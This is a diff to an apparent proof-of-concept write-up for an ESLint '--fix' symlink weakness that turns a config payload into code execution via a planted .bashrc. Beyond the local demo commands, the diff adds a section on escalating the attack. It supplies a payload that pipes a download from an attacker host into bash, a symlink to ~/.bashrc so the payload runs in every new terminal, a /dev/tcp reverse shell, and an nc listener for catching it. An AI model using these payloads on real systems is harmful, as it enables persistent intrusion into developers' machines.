@@ -8,26 +8,39 @@ This is a weakness in ESlint v10.3.0 in which the "--fix" option will follow alo
   
   
   ## Create /tmp/eslint-rce-poc-bashrc
-  cat > /tmp/eslint-rce-poc-bashrc <<'EOF'
+  `cat > /tmp/eslint-rce-poc-bashrc <<'EOF'
   alias ll='ls -la'
-  EOF
+  EOF`
 
   ## Run eslint on the innocuous symlink file
   ### This is almost guaranteed to get an error, but that's fine
-  eslint --fix innocuous.js
+  `eslint --fix innocuous.js`
 
   ## Wait for a developer to open a new shell or source our fake /.bashrc
-  bash --noprofile --rcfile /tmp/eslint-rce-poc-bashrc -i -c 'true' 2>/dev/nul
+  `bash --noprofile --rcfile /tmp/eslint-rce-poc-bashrc -i -c 'true' 2>/dev/nul`
   
   ## Profit(?) View the files in /tmp/eslint-rce-poc-pwned
-  ls /tmp
-  cat /tmp/eslint-rce-poc-pwned;
+  `ls /tmp`
+  `cat /tmp/eslint-rce-poc-pwned`
   
   ## Go fourth and conquer
 
   ## Cleanup command
-  rm -rf /tmp/eslint-symlink-poc /tmp/eslint-symlink-poc-victim.js /tmp/eslint-rce-poc-bashrc
-  /tmp/eslint-rce-poc-pwned
+  `rm -rf /tmp/eslint-rce-poc-pwned`
   
-  # What to watch out for
+  # How to up the ante
+  Within the payload for eslint.config.js, change it to:
+  const PAYLOAD = "\ncurl -s https://attacker.example/x | bash &\n";
+
+  And create a symlink that points to:
+  `ln -s ~/.bashrc innocuous.js`
+
+  Which will have this attack execute code everytime an attacker opens a terminal.
+
+  Better yet, create a reverse shell:
+  const PAYLOAD = "\nbash -i >& /dev/tcp/<your ip>/<your port> 0>&1\n;"
+
+  and have it connect to you on the attacking machine:
+  `nc -lvnp <your port>`
+  
 
